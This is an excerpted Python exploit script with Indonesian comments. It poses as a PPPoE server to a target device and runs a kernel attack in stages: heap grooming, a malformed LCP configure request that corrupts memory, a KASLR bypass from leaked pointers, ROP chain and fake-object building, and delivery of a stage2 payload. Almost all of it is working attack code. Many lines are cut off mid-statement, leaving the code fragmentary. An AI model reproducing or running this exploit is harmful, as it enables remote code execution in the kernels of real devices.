...
class Exploit():
    ...
    def lcp_negotiation(self):
        print('[*] Mengirimkan permintaan konfigurasi LCP...')
        self.s.send(
        ...
        print('[*] Menunggu ACK konfigurasi LCP...')
        while True:
            pkt = self.s.recv()
        ...
        print('[*] Menunggu permintaan konfigurasi LCP...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
        ...
        print('[*] Mengirimkan ACK konfigurasi LCP...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
    ...
    def ipcp_negotiation(self):
        print('[*] Mengirimkan permintaan konfigurasi IPCP...')
        self.s.send(
            Ether(
        ...
        print('[*] Menunggu ACK konfigurasi IPCP...')
        while True:
            pkt = self.s.recv()
        ...
        print('[*] Menunggu permintaan konfigurasi IPCP...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
        ...
        print('[*] Mengirimkan NAK konfigurasi IPCP...')
        self.s.send(
            Ether(
                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
            / PPPoE(sessionid=self.SESSION_ID) / PPP() /
        ...
        print('[*] Mengirimkan ACK konfigurasi IPCP...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
    ...
    def ppp_negotation(self, cb=None, ignore_initial_req=False):
        ...
        if cb:
            ...
            ac_cookie = b''
        print('[+] Panjang cookie AC: {}'.format(hex(len(ac_cookie))))

        print('[*] Mengirimkan PADO...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
    ...
    def build_fake_lle(self):
        # Gadget pertama - harus alamat MAC yang valid
        # Byte atas dienkripsi dengan SESSION_ID
    ...
    def build_second_rop(self):
        ...
        # Memperbaiki offset dari stage1
        rop[rop_off_fixup:rop_off_fixup + 8] = p64(-(len(rop) - rop_rsp_pos))

        return rop

# Fungsi untuk menjalankan serangkaian langkah untuk mengeksploitasi kerentanan dalam sebuah sistem
    def run(self):
        # Memulai thread untuk menangani LCP Echo
        ...
        print('[+] Heap grooming...selesai')

        print('')
        print('[+] STAGE 1: Memory corruption')

        # Mengirim paket yang salah untuk memicu kerentanan di dalam kernel
        for i in range(self.PIN_NUM):
            if i % 0x100 == 0:
                print('[*] Pinning ke CPU 0...{}%'.format(100 * i //
                                                          self.PIN_NUM),
                      end='\r',
                      flush=True)
        ...
        print('[+] Pinning ke CPU 0...selesai')

        sleep(1)

        # Mengirim paket untuk menyebabkan korupsi memori
        overflow_lle = self.build_overflow_lle()
        print('[*] Mengirimkan LCP configure request berbahaya...')
        ...
        print('[*] Menunggu LCP configure reject...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
        ...
        for i in reversed(range(self.SPRAY_NUM)):
            if i % 0x100 == 0:
                print('[*] Mencari objek yang terkorup...{}'.format(hex(i)),
                      end='\r',
                      flush=True)
        ...
        if not corrupted:
            print('[-] Mencari objek yang terkorup...gagal. Mencoba lagi.')
            time.sleep(5)
            exit(1)

        print(
            '[+] Mencari objek yang terkorup...ditemukan {}'.format(source_ipv6))

        print('')
        print('[+] STAGE 2: KASLR defeat')

        print('[*] Mengalahkan KASLR...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
        ...
        if (self.pppoe_softc_list & 0xffffffff00000fff
            ...
            print('[-] Informasi bocor tidak valid. Firmware salah? Mencoba lagi.')
            time.sleep(5)
            exit(1)
        ...
        print('[*] Mengirimkan LCP terminate request...')
        self.s.send(
            Ether(
                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
        ...
        print('[*] Memicu eksekusi kode...')
        self.s.send(
            Ether(src=self.source_mac, dst=self.target_mac) /
            IPv6(src=self.SOURCE_IPV6, dst=self.target_ipv6) /
            ICMPv6EchoRequest())

        print('[*] Menunggu stage1 untuk dilanjutkan...')
        count = 0
        while count < 3:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
        ...
        print('[*] Mengirimkan payload stage2...')
        frags = fragment(
